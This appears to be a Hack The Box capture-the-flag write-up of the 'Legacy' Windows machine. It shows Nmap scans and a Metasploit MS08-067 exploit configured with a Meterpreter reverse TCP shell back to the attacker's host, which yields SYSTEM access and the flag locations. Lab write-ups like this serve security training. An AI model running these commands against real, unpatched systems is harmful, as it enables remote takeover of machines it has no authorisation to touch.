# HTB — Legacy

**Difficulty:** Easy
**OS:** Windows
**CVE:** CVE-2008-4250 (MS08-067)

---

## Phase Recon

Initial Nmap scan against the target:

```bash
nmap -sS -sV -O -p- 10.xx.xx.xx
```

Revealed three open ports: **135**, **139**, and **445** — all SMB-related, indicating a Windows host.

A follow-up vulnerability script scan:

```bash
nmap --script=vuln 10.xx.xx.xx
```

Identified the system as vulnerable to **MS08-067** (CVE-2008-4250) — a critical remote code execution vulnerability in the Windows Server service affecting Windows XP SP2/SP3, Server 2000/2003.

---

## Phase Exploit

Loaded the Metasploit module `windows/smb/ms08_067_netapi` and configured it as follows:

```
set RHOSTS <target IP>
set LHOST <VPN interface>
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp
```

Executed the exploit and received a **Meterpreter shell**. Running `getuid` immediately confirmed:

```
Server username: NT AUTHORITY\SYSTEM
```

No privilege escalation was required — the vulnerable service runs as SYSTEM, so successful exploitation grants the highest privilege level directly.

Located flags using Meterpreter's search function:

```bash
search -f user.txt
# Found: c:\Documents and Settings\john\Desktop\user.txt

search -f root.txt
# Found: c:\Documents and Settings\Administrator\Desktop\root.txt
```

Flags retrieved and redacted.

---

## Phase Privilege Escalation

Not applicable. MS08-067 exploits a SYSTEM-level service (Server service / `netapi32.dll`), meaning the shell spawns directly as `NT AUTHORITY\SYSTEM`. No local privilege escalation chain was needed.

---

## Key Takeaways

- Always run `--script=vuln` after initial port discovery — it identified the critical CVE in one pass
- MS08-067 is a classic "fire and forget" exploit; reliable and immediate on unpatched XP/2003 systems
- When landing directly as SYSTEM, skip privesc and move straight to flag/data collection
